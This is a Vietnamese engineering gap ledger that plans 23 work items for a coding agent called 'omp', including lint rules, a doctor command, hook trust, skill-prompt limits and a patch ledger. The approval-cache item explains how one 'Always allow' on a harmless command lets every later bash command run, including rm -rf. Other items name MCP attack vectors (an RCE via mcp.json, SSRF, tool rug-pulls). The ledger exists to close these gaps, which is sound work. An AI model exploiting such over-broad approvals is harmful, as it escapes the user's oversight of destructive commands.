# SỔ KHOẢNG TRỐNG — 5 repo tham chiếu → 23 work item cho omp

Ngày: 2026-09-29 · Nguồn: `dsh`, `codex`, `gajae`, `cc`, `senpi` · Đích: `MILESTONE_{1,2,3,4,6,7}_EXECUTION_PLAN.md`

Đây là sổ **đề xuất**, chưa phải sổ đã giao. Sổ này **không thêm** work item nào ngoài 25 mục đầu vào. Nó làm ba việc: **gộp trùng**, **sắp theo cái mở khoá**, và bổ sung hai trường mà danh sách đầu vào thiếu — **cái được bảo toàn** và **phần cần người quyết**.

---

## 0. Những gì đã kiểm lại trên cây hiện tại

Trước khi ghi sổ, từng khẳng định mang tính quyết định đã chạy lại. Phần lớn đúng; **ba chỗ sai hoặc thiếu chính xác**, đã sửa ngay trong các mục dưới:

| Khẳng định đầu vào | Kết quả kiểm | Xử lý |
| --- | --- | --- |
| `git grep -rn "getConflicts"` → đúng 2 hit | **Sai một nửa.** Tên này còn xuất hiện ở `packages/mnemopi/src/core/veracity-consolidation.ts:360` — class khác hoàn toàn, trả `Conflict[]` cho fact-collision, và *có* call site thật. | Kết luận của GAP-M3-B4 **đứng vững** (bản `keybindings.ts:317` vẫn chỉ có đúng 2 hit: định nghĩa + test của chính nó). Chỉ sửa con số. |
| `failChatSpan` ghi lỗi thô vào span | **Đúng nội dung, thiếu đường dẫn.** File là `packages/agent/src/telemetry.ts`, không phải `packages/coding-agent/src/telemetry.ts`. Dòng `:1205` và `:1208` khớp tuyệt đối. | GAP-M6-10 ghi rõ `packages/agent/` — nó kéo theo ranh giới package khác phần còn lại của M6. |
| Thêm `no-console` vào `.oxlintrc.json` bằng `overrides` | **Đúng, nhưng phải nói thêm.** `.oxlintrc.json` đã có sẵn `ignorePatterns` 24 dòng. Đưa entrypoint CLI vào **đó** sẽ tắt **mọi** rule khác trên các file đó, không chỉ `no-console`. | GAP-M1-19: dùng `overrides` theo đường dẫn, **không** đụng `ignorePatterns`. |

Hai điều kiện tiên quyết về con số cũng đã xác nhận: `patches/` có **đúng 2 file** và `package.json:206-209` khai đúng 2 mục `patchedDependencies` — **không** có mismatch cấu hình. Khoảng trống nằm ở tài liệu, không ở wiring. Và `runDoctorChecks` có **đúng 1 hit toàn repo, là chính dòng định nghĩa** (`plugins/doctor.ts:5`) — zero call site, đã xác nhận.

---

## 1. Bảng tổng số work item theo milestone

| Milestone | Mới | Số | Tổng effort xấp xỉ |
| --- | --- | --- | --- |
| **M1** | GAP-M1-18, GAP-M1-19, GAP-M1-20 | 3 | S + S + S–M ≈ 3 ngày |
| **M2** | GAP-M2-7, GAP-M2-8 | 2 | M + S ≈ 2,5 ngày |
| **M3** | GAP-M3-B4, GAP-M3-B5 | 2 | S + S ≈ 1,5 ngày |
| **M4** | GAP-M4-10, GAP-M4-11, GAP-M4-12, GAP-M4-13 | 4 | S + M + S–M + M ≈ 6 ngày |
| **M6** | GAP-M6-08 … GAP-M6-16 (9 mục) | 9 | S + S + M + M + M + S + M + S + S ≈ 15 ngày |
| **M7** | GAP-M7-01, GAP-M7-02, GAP-M7-03 | 3 | M–L + S + M ≈ 3,5 ngày |
| **Tổng** | | **23** | **≈ 31 ngày** |

25 mục đầu vào → 23 mục. Một gộp duy nhất, giải thích ở §2.

### Thứ tự mở PR, theo cái mở khoá

Không phải thứ tự milestone. Đây là thứ tự **mở**:

1. **GAP-M1-18** (`omp doctor`) — mở khoá cho cả GAP-M4-10 (nó là nơi báo ledger hỏng) và là bằng chứng sống cho code chết. Không chặn gì.
2. **GAP-M1-19** (no-console) — rẻ nhất toàn sổ, độc lập tuyệt đối. Mở song song với #1.
3. **GAP-M4-10** (patch ledger) — độc lập, nhưng phải merge **trước** khi doctor báo được hàng ledger.
4. **GAP-M2-7** (hook trust) — chặn bởi M2 WI-0. **WI-0 là cái mở khoá lớn nhất của sổ này**: nó chốt câu hỏi mà cả GAP-M2-7 lẫn GAP-M7-01 đều cần.
5. **GAP-M7-01** (RCE mcp.json) — **cao nhất về rủi ro, thấp nhất về công sức.** Không nên để một RCE đã biết nằm qua biên milestone.
6. **GAP-M1-20** (approval cache key) — sau W6.
7. Phần còn lại theo thứ tự milestone.

---

## 2. Những gì đã gộp, và những gì cố ý KHÔNG gộp

### Đã gộp: ba mục "doctor" thành một → GAP-M1-18

`codex.127`, `dsh.105` và `gajae.33 + gajae.106` là **ba phát biểu khác nhau về cùng một lệnh**. Cả ba đều kết luận bằng câu giống nhau: omp đã viết `runDoctorChecks`, đã re-export nó qua barrel, và không bao giờ gọi. Giữ ba mục nghĩa là ba lần sửa cùng một tệp trong ba milestone khác nhau.

Đã gộp thành **GAP-M1-18**. Chi tiết ở mục đó.

### Cố ý KHÔNG gộp: hook failure labeling (GAP-M4-12) vs hook schema validation (GAP-M6-11)

Hai mục này cùng sửa `extensibility/hooks/`, và người đọc lẽ ra sẽ ghép. Đã cân nhắc và **giữ riêng**, vì hợp đồng test khác hẳn nhau:

- GAP-M4-12 sửa **nhãn trên một quyết định**: `{ block: true }` từ handler thật vs `{ block: true }` do handler crash. Cổng đỏ là **âm**: handler trả `block` thật vẫn phải ra nhãn `denied`.
- GAP-M6-11 sửa **hình dạng giá trị trả về** trước khi nó đi vào host control flow. Cổng đỏ là: plugin trả object sai schema thì host báo mã chẩn đoán, không im lặng `as` một cái.

Gộp sẽ tạo ra một PR sửa 5 file với hai cổng đỏ không liên quan, và khó review hơn cả hai. Giữ riêng, **nhưng phải ghi thứ tự merge** — xem mục GAP-M6-11.

### Cố ý KHÔNG gộp: ba mục bảo mật MCP

GAP-M6-12 (chặn mạng / SSRF), GAP-M7-01 (`!command` trong mcp.json / RCE), GAP-M7-03 (rug-pull trên `list_changed`) là **ba vectơ tấn công khác nhau** với ba chỗ sửa khác nhau. Gộp sẽ tạo ra một PR mà không ai đọc nổi. Giữ ba mục, nhưng xếp cạnh nhau trong một cụm, và **GAP-M7-01 phải làm trước GAP-M7-03** vì nó là lỗ hổng đang sống còn lại thì chỉ là điều chỉnh.

---

## 3. Các work item

---

# M1 — Bao trọn `pi`

## GAP-M1-18 — `omp doctor`: một lệnh chẩn đoán, hai lối ra, tự thừa nhận chỗ nó mù

**Nguồn (đã gộp):** `codex.127` + `dsh.105` + `gajae.33` + `gajae.106`
**Milestone:** M1 — ngay sau W17
**Effort:** M

**Vì sao ở đây, và vì sao không ở M4 Wave D như đề xuất ban đầu.** Ba nguồn đều xếp vào ba milestone khác nhau (M1, M4 Wave D, M6). M4 Wave D có một lý do chống lại nó rất cụ thể: M4-9 (`omp extensions-triage`) đang mở đúng đường `cli-commands.ts` mà `doctor` cũng cần, **và** bảng cổng của M4-9 tự nói rằng "Command có thật sự được đăng ký hay không" là thứ **không cổng nào bắt được, người review phải tự mắt xác nhận**. Đặt hai lệnh mới vào cùng một milestone làm một điểm mù không có test bắt trở thành hai. M1 không có tiền lệ (W13, W17 không chặn gì), và làm ở M1 thì dead code có consumer thật sớm nhất.

**Cái omp thiếu.** `runDoctorChecks` (`packages/coding-agent/src/extensibility/plugins/doctor.ts:5`) — **đã kiểm: đúng 1 hit toàn repo, là chính dòng định nghĩa**. Nó kiểm 3 công cụ ngoài và 3 API key, trả `DoctorCheck[]`. `formatDoctorResults` ngồi cạnh nó, cũng chết. `cli-commands.ts` đăng ký 50 command, **không có** `doctor`. Ba doctor còn lại đều hẹp: `IMAGES_ACTIONS` (`images-cli.ts:50`) và `plugin-cli.ts:32`. M3 đã **chủ động loại** cái này khỏi phạm vi (`:2013`, `:2552` — "dead code thấy lúc đi ngang, cố ý KHÔNG vào scope"), nên nó không thuộc đợt nào. Nửa còn lại của `dsh.105` cũng thiếu: `packages/utils/src/logger.ts:171` gọi `fs.mkdirSync(dir, { recursive: true })` không truyền `mode`, nên `~/.omp/logs` theo umask.

**Hình dạng port.**
1. **Một module thu thập check không phụ thuộc TUI**, trả `readonly DoctorCheck[]` có `severity` + `name` + `detail` + `remedy`. `ImagesDoctorResult` (`images-cli.ts:136-145`, đã có sẵn `exitCode` + `healthy` + `checks`) là khuôn có thật — dùng lại, không phát minh.
2. **Một bảng registry check**, mỗi check là hàm thuần. Đây là chỗ duy nhất lấy cảm hứng hình dạng từ codex.
3. **Hai lối ra dùng chung một module**: `omp doctor` (stdout, `exit 0|1`) và một mục trong `/debug`. Bước này biến một script thành một hợp đồng test được.
4. **Header tự cảnh báo** (`dsh.105`): check nào hỏng tiền đề thì in "không kiểm được X vì Y" thay vì im lặng bỏ qua. **Áp dụng bắt buộc cho check ledger** — nếu GAP-M4-10 chưa merge, check phải nói *đó*, không được báo xanh.
5. `mkdirSync` với `mode: 0o700`, và một dòng trong doctor báo mode thật.

Danh sách check, **chốt trước khi viết dòng nào**: config parse + `assertKnownSettingPaths`; credential reachability cho provider đang chọn (**chỉ báo có/không, không in giá trị**); parity `patches/*.patch` ↔ `package.json.patchedDependencies`; thư mục log; số extension active; `PATH`/`which` cho `git`; native addon đã build chưa. **Không** đưa vào: probe network, sandbox, bất kỳ thứ gì cần network.

**Pháp lý:** chỉ mang ý tưởng, không chép dòng nào. `codex-rs/cli/src/doctor.rs` là 4.352 dòng Rust mô tả sản phẩm có hàng trăm biến môi trường quản trị (managed-env, spoofed version) — á vào omp là vô nghĩa. `dsh` MIT, `gajae` MIT thuần. Nhánh Apache-2.0 của codex: nếu có bất kỳ dòng nào được lấy thì bắt buộc giữ `LICENSE` 201 dòng + `NOTICE` (**dòng ghi công Ratatui theo MIT trong `NOTICE` — xoá là vi phạm Điều 4(d)**) + tuyên bố đã sửa đổi. **Khuyến nghị: không lấy dòng nào** — phần duy nhất đáng học là *tính tụ lệnh*, mà omp đã có sẵn khuôn.

**Cái được bảo toàn.** `cli-commands.ts` phải **thật sự** chứa mục `doctor` — thiếu nó thì `omp doctor` rơi xuống `runCli` và argv thành prompt cho LLM (hồi quy #1499/#1496). `plugins/doctor.ts` phải giữ nguyên xuất kể cả sau khi có consumer. `logger.ts` phải giữ `mkdirSync` với `recursive: true` — chỉ thêm `mode`. Ba verb `doctor` sẵn có (`plugin-cli.ts:672`, `images-cli.ts:546`) phải giữ nguyên hành vi.

**Cần người quyết →** xem GAP-D4 ở §4.

---

## GAP-M1-19 — Cấm `console.*` ở tầng thư viện bằng lint, thay vì bằng quy ước trong `AGENTS.md`

**Nguồn:** `codex.57`
**Milestone:** M1 — cùng sóng với W13
**Effort:** S — nửa ngày. Đây là mục có tỉ lệ giá trị/công sức cao nhất trong toàn sổ.

**Cái omp thiếu.** Quy tắc chỉ tồn tại bằng văn xuôi. **Đã kiểm: `grep -c 'no-console' .oxlintrc.json` → 0.** Và quy tắc đang bị vi phạm: `git grep -l 'console\.\(log\|error\|warn\|info\|debug\)' -- 'packages/*/src/**/*.ts' | wc -l` → **33 file**. Đáng chú ý nhất: `packages/ai/src/providers/cursor.ts:405` nằm trong **provider wire code** — đúng loại lỗi mà `AGENTS.md` mô tả là "hỏng rendering hoặc hỏng protocol cho mọi consumer cùng lúc". Đối chiếu codex: `codex-rs/core/src/lib.rs` chỉ có `#![deny(clippy::print_stdout, clippy::print_stderr)]` + chú thích 2 dòng — **một dòng cấu hình**, không phải một hệ thống.

**Hình dạng port.** Ba việc:
1. Thêm `eslint/no-console: "error"` vào `.oxlintrc.json` với `overrides` **allow-list theo đường dẫn** cho đúng các entrypoint CLI mà `AGENTS.md` đã cho phép (`packages/*/src/cli/**`, `packages/*/src/commands/**`, `packages/metaharness/src/tb/cli.ts`).
   > **Sửa so với đề xuất ban đầu:** cơ chế đúng là `overrides`, **không** phải `ignorePatterns`. File đã có sẵn `ignorePatterns` 24 dòng; đưa entrypoint vào đó sẽ tắt **mọi** rule khác trên các file đó, không chỉ `no-console`.
2. Sửa ~10 file còn lại sang `logger`. Riêng `mnemopi/src/core/migrations/e6-triplestore-split.ts:149,156` đang dùng `console.log` làm **default parameter** (`logFn: (line: string) => void = console.log`) — cần đổi thành sink rõ ràng, không phải đổi tên.
3. **Allowlist bằng test**, không bằng lint-ignore, để "vì sao file này được phép" là giá trị quan sát được.

`packages/tui/**` **không** cần override — TUI đã sạch (`tab-bar.ts:54` chỉ là console.log trong *chú thích JSDoc*, không phải mã chạy).

**Pháp lý:** chỉ mang ý tưởng, mức nhẹ nhất trong sổ — ý tưởng là "cấm ở tầng lint chứ không ở tầng quy ước". Không có dòng code nào để chép: codex dùng attribute Rust, omp cần rule oxlint, hai ngôn ngữ khác nhau.

**Cái được bảo toàn.** Đường phép dùng `console.*` của `AGENTS.md` phải giữ nguyên nghĩa — exception "Standalone CLI commands that exit without entering the TUI" **không được** thu hẹp thành allow-list tĩnh, vì allow-list sẽ chết khi có entrypoint mới. Quy tắc mới phải **mở rộng** exception đó, không thay nó.

**Cổng đỏ ngay:** thêm một `console.log` vào bất kỳ file thư viện nào là `bun run lint` đỏ. Không cần test nào khác để chứng minh item này.

---

## GAP-M1-20 — Khoá cache `allow_always` theo hành động đã canonicalize, không theo tên tool

**Nguồn:** `codex.49` + `codex.79` + `codex.95`
**Milestone:** M1 — ngay sau W6
**Effort:** S–M (1–1,5 ngày)

**Cái omp thiếu — đây là lỗ hổng, không phải thiếu tiện nghi.** **Đã kiểm:** `packages/coding-agent/src/session/acp-permission-gate.ts` trả `cacheKey: toolName` ở mọi nhánh — dòng `:55` (bash), `:63` (delete), `:70` và `:75` (move). Nghĩa là `getPermissionIntent` **tính title từ lệnh** (`.slice(0, 80)`) nhưng lại **khoá cache bằng tên tool**.

Hệ quả quan sát được: user bấm "Always allow" một lần trên `git status` ⇒ `#acpPermissionDecisions.set("bash", "allow_always")` (`session/session-tools.ts:991`) ⇒ **mọi lệnh bash sau đó trong phiên đều tự động qua**, kể cả `rm -rf`. Đây là phê duyệt lan rộng ngoài ý muốn. `docs/approval-mode.md` không đề cập, và M6 §3 nói approval của omp "đã hoàn chỉnh" — câu đó nói về ba tầng tool / ba chế độ / ba quyết định, không nói về khoá cache.

**Hình dạng port.** Không chép file 42 dòng Rust của codex; chép **ý**. Ba việc:
1. Một hàm canonicalize dùng chung `canonicalizeApprovalKey(toolName, args)` cạnh `getPermissionIntent` — trả khoá theo lớp: `bash` + mảng lệnh đã parse (dùng lại parser sẵn có của `bash-interceptor.ts`), `delete`/`move` + đường dẫn đã `realpath`, `edit` + loại thao tác phá hủy.
2. Đổi `PERMISSION_OPTIONS` để "Always allow" mang khoá đó theo, **và hiển thị phạm vi sắp cấp** ("allow `git status` for the rest of this session"). Nếu không hiện phạm vi thì key tốt hơn cũng không giúp — user vẫn không biết mình vừa cấp gì.
3. Giữ nguyên `reject_always` theo cùng khoá.

**Bản âm phủ định bắt buộc:** hai lệnh khác nhau cùng tool phải hỏi riêng. Không có nó thì "sửa" này chỉ là thêm chi tiết.

**Pháp lý:** chỉ mang ý tưởng. 42 dòng Rust, còn omp cần TypeScript trên cấu trúc lệnh đã có. Không có ràng buộc NOTICE nào (không liên quan Ratatui).

**Cái được bảo toàn.** `reject_always` phải dùng **cùng** khoá mới — nếu tách, một lệnh bị từ chối vĩnh viễn sẽ lại hỏi lại. Ba chế độ approval và ba tầng tool trong `docs/approval-mode.md` + 1.471 dòng test hiện có **không được đổi hình dạng**; item này chỉ đổi cách *ghi nhớ* một quyết định, không đổi tập quyết định.

**Cần người quyết →** xem GAP-D5 ở §4.

---

# M2 — Mọi thứ là plugin

## GAP-M2-7 — Trust state cho hook handler: 4 trạng thái theo content hash

**Nguồn:** `codex.21`
**Milestone:** M2 — ngay sau WI-0
**Effort:** M — nhỏ hơn vẻ ngoài

**Đây chính là mục mà M2 WI-0 đã để trống có chủ.** WI-0 là quyết định (viết ADR, không code); **bước 8 của nó nói thẳng phần thực thi phải được đặt tên, có chủ và có hạn** — và không milestone nào trong toàn bộ chương trình đặt tên nó. Đây là mục đó.

**Cái omp thiếu.** omp có hệ hook giàu hơn codex về số event, nhưng **không có bất kỳ trạng thái trust nào**. Đã kiểm: `contentHash|trustState` → chỉ trúng `blob-broker/provider-file-types.ts` (cache hash file tải lên, không liên quan); `approvedHooks|hookApproval|consentPrompt` → 1 hit thuộc `packages/catalog/src/discovery/cursor-proto.ts` (tên trong protobuf của Cursor). Hai chỗ còn lại là chú thích thừa nhận sự thật: `extensibility/extensions/types.ts:490-494` ("OMP performs no project-trust gating") và `:552-563`, với `isProjectTrusted()` hiện thực là `() => true`.

**Hệ quả quan sát được:** sửa file hook sau khi user duyệt thì hook đó chạy y hệt, không có tín hiệu nào.

**Hình dạng port.** KHÔNG chép `codex-rs/hooks/src/engine/discovery.rs` (1.741 dòng cho cả discovery lẫn trust). Chỉ mượn **hình dạng hợp đồng**, viết lại bằng idiom omp:
1. Union 4 giá trị `untrusted | trusted | modified | admin` đặt cạnh `HookEvent` ở `extensibility/hooks/types.ts`.
2. Mỗi handler lấy khoá ổn định — **omp đã có sẵn đúng cái khoá này** ở `capability/hook.ts:31` (`key: hook => \`${hook.type}:${hook.tool}:${hook.name}\``), nên **không cần** chuỗi 4 thành phần của codex.
3. `currentHash` = hash của (type, tool, name, path). Chỉ cần hash **đường dẫn + nội dung script**, không cần hash matcher như codex — omp không có khái niệm matcher group.
4. `HookStateToml { enabled?, trustedHash? }` lưu cạnh config, đọc qua đường sự thật đã có sẵn — `config/settings.ts` đã có `SettingProvenance` 6 lớp mà M4-6 dùng.
5. **Bề mặt hiển thị:** `packages/tui/src/overlays/hook-editor.ts` (277 dòng) đã là overlay sửa hook — thêm cột trạng thái vào đó, **không cần overlay mới**. Nửa `enabled` per-handler là cột thứ hai trong cùng bảng.

**Pháp lý:** chỉ mang ý tưởng. Cơ chế là 1 enum 4 biến + 1 hàm so sánh hash, vài chục dòng TypeScript. Tên enum của Rust không được bảo hộ, nhưng **không** lấy `HookTrustStatus` nguyên văn. Nếu lấy bất kỳ dòng nào: giữ `LICENSE` + `NOTICE` (dòng Ratatui) + tuyên bố đã sửa đổi.

**Cái được bảo toàn.** Đây là lần đầu omp có **đường nạp hook bị chặn**. `hook-editor.ts` phải giữ nguyên mọi chức năng sửa hook sẵn có. Hai test sẵn có — `test/hook-editor.test.ts` và `test/extension-context-project-trust.test.ts` — **được phép chuyển đỏ nếu chúng đang khẳng định hành vi cũ**, nhưng phải nêu rõ trong PR vì sao (không phải sửa cho xanh).

**Cần người quyết →** xem GAP-D3 ở §4.

---

## GAP-M2-8 — Giới hạn khối `<skills>` nạp vào system prompt, và thêm `list`/`search` cho `manage_skill`

**Nguồn:** `codex.9`
**Milestone:** M2 — cùng sóng với WI-6
**Effort:** S — khoảng 1 ngày cho cả hai nửa

**Cái omp thiếu — đã kiểm.** `git grep -ril 'bm25|reciprocal.rank|ngram' -- packages/ crates/` → chỉ trúng `crates/pi-predict` (bộ dự đoán token). Nhưng hình thù thiếu **không phải** "thiếu 8 bộ ranker" — đó là quy mô không tương xứng (codex: 87 file / 22.712 dòng cho `ext/skills/`). Hình thù thiếu thật, đo được: `prompts/system/system-prompt.md:30-35` là `{{#each skills}} - {{name}}: {{description}} {{/each}}` — **không có trần**, mọi skill đều vào prompt. Hai nút giảm nhẹ đã có và **đều không giải quyết việc chọn**: `skillful` chỉ chuyển khối `<skills>` sang `skillful-notice.md` (vẫn liệt kê tất cả), và `skill-descriptions.ts` nén description xuống 12 từ (`MAX_COMPRESSED_WORDS = 12`) — nén **từng mục**, không **chọn mục nào**. Phía model: `manage_skill` chỉ có `action: "'create' | 'update' | 'delete'"` (`tools/manage-skill.ts:17`) — **không có `list`, không có `search`**.

**Hình dạng port.** KHÔNG chép `dynamic_skill_selector/` — đó là 8 ranker song song để **so sánh**, tức công việc nghiên cứu của họ, không phải kết quả. Hai nửa, và **nửa hai quan trọng hơn**:
1. **Trần + bật toán** cho khối `<skills>` — một hằng duy nhất trong `config/registry.ts` (ví dụ 20 mục, ưu tiên theo thứ tự khai báo, phần dư ghim rút gọn). **Nhánh phủ định bắt buộc:** dưới trần, output **giống từng byte** với hiện tại, để skill mới thêm vào không làm prompt đổi hình dạng ngoài dự kiến.
2. `manage_skill` nhận thêm action `list` với tham số `query?` — trả tên + description của các skill khớp, **không** nạp body.

Nhờ vậy danh sách đầy đủ luôn *truy cập được*, chỉ không phải *luôn chiếm chỗ*.

**Pháp lý:** chỉ mang ý tưởng, cần nói rõ mức: *chọn thay vì nạp tất cả* là nguyên thủy, không ai sở hữu được. Không chép 22.712 dòng Rust, cũng không lấy tên file ranker. Nếu sau này cần BM25 thật, đó là quyết định riêng và Apache-2.0 vẫn cho phép kèm nghĩa vụ giữ LICENSE + NOTICE + tuyên bố sửa đổi.

**Cái được bảo toàn.** Nhánh dưới trần phải **byte-identical**. `skillful` phải giữ nguyên cơ chế chuyển khối. `MAX_COMPRESSED_WORDS = 12` giữ nguyên. Đây là điểm phân biệt item này với một refactor "thêm giới hạn": một thay đổi chỉ-đổi-hình-dạng xanh ở mọi nơi và không đến với ai.

**Cần người quyết →** xem GAP-D6 ở §4.

---

# M3 — Bề mặt người dùng kiểu Claude Code

## GAP-M3-B4 — Đưa `getConflicts()` ra khỏi phòng thí nghiệm: báo trùng phím lúc nạp

**Nguồn:** `cc.96`
**Milestone:** M3 — Sóng 4, cùng sóng với B3
**Effort:** S — khoảng 1 ngày

**Cái omp thiếu — phần DÒ thì có, phần HIỆN thì không.** `KeybindingsManager` (`packages/tui/src/keybindings.ts:247`) đã có sẵn `#conflicts: KeybindingConflict[]` (`:252`), đã điền trong `#rebuild()` (`:259-278`) bằng đúng thuật toán cc mô tả. `canonicalKeyId` (`:190`) và `addKeyAliases` (`:222`) đã loại nốt vụ escape/alias. Nhưng `getConflicts()` (`:317`) **không có nơi tiêu thụ nào ngoài chính test của nó**.

> Đính chính số: `git grep -rn getConflicts` cho **nhiều hơn 2 hit** — nhưng phần dư là `packages/mnemopi/src/core/veracity-consolidation.ts:360`, một class khác hoàn toàn (`Conflict[]` cho fact-collision) **có** call site thật. Bản của `keybindings.ts` vẫn chỉ có đúng 2 hit: định nghĩa + `packages/tui/test/keybindings.test.ts:38`. Kết luận không đổi.

**Hệ quả:** bind `ctrl+k` cho cả `interrupt` lẫn `scrollDown` trong `keybindings.yml`, cả hai đều chạy, và không một dòng nào nói cho user biết cái thứ hai đã chết. Đây là tiêu chí **hỏng âm thầm** — im lặng, không đỏ, không xanh.

**Hình dạng port.** Không sao chép dòng nào.
1. Một hàm thuần trong `packages/tui/src/chrome/keybinding-hints.ts` cạnh `appKey` (`:47`) — `formatConflictWarning(conflicts)` trả chuỗi nhiều dòng, mỗi dòng là key + danh sách hành vi tranh nhau, **đã đi qua `replaceTabs` / `truncateToWidth` / `shortenPath` / `PREVIEW_LIMITS`** theo `AGENTS.md` vì đây là text đi ra TUI.
2. Một call site lúc nạp trong `modes/interactive-mode.ts` ngay sau `KeybindingsManager.create()` (`:1596`) — nếu `getConflicts()` khác rỗng thì đẩy qua `showWarning` (nhánh bền vững, không bị `invalidates` của A7 dọn), **không** đi qua `showStatus`, vì đây là lỗi cấu hình cần sống sót.
3. Panel `/keybindings` là việc riêng — **đừng gộp**.

**Pháp lý:** CHỈ MANG Ý TƯỞNG. Đã kiểm `~/Projects/claude-code-ref`: **không có file LICENSE** (`ls LICENSE*` → no matches), `package.json` **không khai field `license`**, cấu trúc là private + educational (`.impeccable.md` ghi rõ all rights belong to Anthropic). Không một dòng nào được chép. Giá trị nằm ở câu hỏi "ai tiêu thụ kết quả này" — đó là suy luận, không phải sao chép.

**Cái được bảo toàn.** Thuật toán `#rebuild()` **không được sửa** — item này chỉ thêm consumer. `canonicalKeyId` + `addKeyAliases` phải giữ nguyên, nếu không số liệu trùng sẽ sai (một key escape và một key thật sẽ bị báo trùng giả). Cảnh báo phải đi qua `showWarning` nên A7 phải merge trước, không phải sau.

**Phụ thuộc:** không chặn M2, không cùng file với A3/D3, không bị Q6 chặn. Chạy song song với A1/A8/A6/A5 của Sóng 1.

**Cần người quyết →** xem GAP-D7 ở §4.

---

## GAP-M3-B5 — Bật trục ưu tiên và hạn sống cho hàng thông báo tạm

**Nguồn:** `cc.81`
**Milestone:** M3 — Sóng 2, ngay sau A7
**Effort:** S — 0,5–1 ngày

**Cái omp thiếu — đã kiểm cả hai trục đều thật sự vắng, không phải "ở nơi khác".** A7 đã cài 4 trong 5 trục của cc.81 (`key`, `invalidates`, `fold`, `immediate`) bằng `ShowStatusOptions` tại `ui-helpers.ts:143`. Hai trục còn lại:
1. `showStatus` hôm nay nhận **đúng** `{ dim?: boolean }` — không tham số ưu tiên, không tham số hạn.
2. `grep 'expiresIn|autoHide|dismiss|setTimeout'` trên `chrome/message-notice.ts` và `ui-helpers.ts` → **0 hit**. `MessageNoticeComponent` (`message-notice.ts:37`) chỉ có `#expanded` và `#toolActivityVisible`. Kế hoạch M3 tự xác nhận điều này ở dòng 809 và **cấm** tái dùng nó làm bồn notice của A7.

**Hệ quả:** một notice có `key` sẽ nằm vĩnh viễn tới khi bị thông báo khác đuổi; khi nhiều loại cùng lúc thì thứ nào thắng là thứ tự gọi — user không có cách nào ưu tiên cái quan trọng hơn.

**Hình dạng port.** Mở rộng `ShowStatusOptions` (thêm `priority?: number` và `ttlMs?: number`) và thêm một bộ so sánh ưu tiên + một timer hết hạn vào **đúng nhánh có-khoá mà A7 đã dựng**. Cả hai thuần-tình: hàm `shouldReplaceNotice(incoming, queued)` và hẳn giờ qua timer (AGENTS.md cấm `new Promise(r => setTimeout(r, ms))`).

**Pháp lý:** CHỈ MANG Ý TƯỞNG. Cùng phán quyết: cc không có LICENSE, không khai `license`. Ý tưởng lấy từ: một hàng thông báo tạm thì phải tự biến mất, và thứ nào quan trọng hơn phải thắng — phán đoán thiết kế, không phải code.

**Cái được bảo toàn.** **Nhánh không-có-khoá phải giữ nguyên từng byte** — đó là điều khoản byte-identity A7 đã đặt, B5 không được làm mờ nó. `MessageNoticeComponent` giữ nguyên hai field sẵn có; TTL là cơ chế ở tầng `ui-helpers.ts`, **không** phải một timer thứ hai bên trong component.

**Phụ thuộc:** A7 bắt buộc. B5 sửa `ui-helpers.ts` quanh dòng 143 và `interactive-mode.ts` quanh 1728 — đúng vùng A7 đã sửa. Làm song song nghĩa là sửa một file hai lần trong hai commit liên tiếp.

---

# M4 — Mượn kỷ luật, không mượn kiến trúc

Bốn M4 mới dưới đây sửa **cùng một lớp vi phạm** với M4-4/6/7/9: hệ thống tuyên bố một điều mà nó không kiểm chứng được. Đó là lý do cả bốn nằm ở M4 chứ không rải đi.

| Mục | Sóng | Nguồn | blocks |
| --- | --- | --- | --- |
| GAP-M4-10 | D | `dsh.11` + `dsh.37` | — |
| GAP-M4-11 | B | `dsh.106` | — |
| GAP-M4-12 | C | `dsh.100` | — |
| GAP-M4-13 | B | `dsh.85` | — |

## GAP-M4-10 — Sổ bản vá phụ thuộc cục bộ: mỗi hunk phải trả lời được "vá cái gì, vì sao, bỏ khi nào"

**Milestone:** M4 Wave D — cùng đợt M4-9, không chặn ai
**Effort:** S

**Vì sao Wave D.** Nó là việc đọc-một-lần-để-hiểu, giống hệt `omp extensions-triage`. Đặt ở Wave B sẽ kéo thêm một quyết định release vào PR đang tranh luận về rollback của `/settings`. **Thứ tự bắt buộc: merge trước GAP-M1-18** — không có `LEDGER.md` thì doctor không có gì để báo.

**Cái omp thiếu — đã kiểm, và đây là tin tốt.** omp patch thật, nhưng **không có sổ**. `patches/` chứa đúng 2 file: `puppeteer-core@25.3.0.patch` (34 KB, 12 `diff --git`, trong đó 10 file là mã thư viện thật — `lib/puppeteer/api/ElementHandle.js`, `api/Frame.js`, `cdp/ExecutionContext.js`, `cdp/Frame.js`, `cdp/FrameManager.js`, `cdp/IsolatedWorld.js`, `cdp/WebWorker.js`, `common/util.js`, `common/QueryHandler.js`, `node/ChromeLauncher.js`; 387 dòng +, 58 dòng -) và `@ark%2Fschema@0.56.2.patch` (1.4 KB). Cả hai nối đúng vào `package.json:206-209`.

**Không có mismatch cấu hình.** `ls patches/*.patch | wc -l` → 2, khớp đúng 2 mục `patchedDependencies`. Phần "vá cái gì" đã có. Phần thiếu là **vì sao và bỏ khi nào**: lý do nằm rải rác bên trong chính diff dưới dạng comment `// xxx-stealth:`; `grep 'omp patch'` trong file puppeteer → **0 hit**, chỉ file `@ark/schema` có một marker `(omp patch)` ở hunk đầu. Marker đó không nói hunk nào sửa issue upstream nào, không nói version nào sẽ nuốt nó, không nói 10 file kia còn là puppeteer nữa hay đã thành fork. `THIRD-PARTY-NOTICES.txt:904` chỉ ghi `puppeteer-core 25.3.0 — Apache-2.0` — đó là **giấy phép**, không phải **ghi nhận sửa đổi**.

**Hình dạng port.** Không chép dòng nào từ dsh. Bốn việc:
1. Một script **sinh** `patches/LEDGER.md` từ chính diff — mỗi hunk một dòng: file bị sửa, mục đích, issue/PR upstream, `drop-when: <version>`. Vì nó **sinh** nên không thành nguồn sự thật thứ hai — đúng luật M4.
2. Một hàng bắt buộc cho mỗi hunk; hunk nào không có hàng thì tool fail.
3. Một test đọc `package.json.patchedDependencies` + `patches/*.patch` + `LEDGER.md` và đỏ khi ba tập lệch nhau. Đây là **hợp đồng quan sát được, không phải source-grep** — AGENTS.md cấm source-grep trong test.
4. `CONTRIBUTING.md` (đã kiểm: **0 dòng nào nhắc `patch`**) thêm một mục ngắn: thêm patch = thêm hàng ledger, cùng một PR.

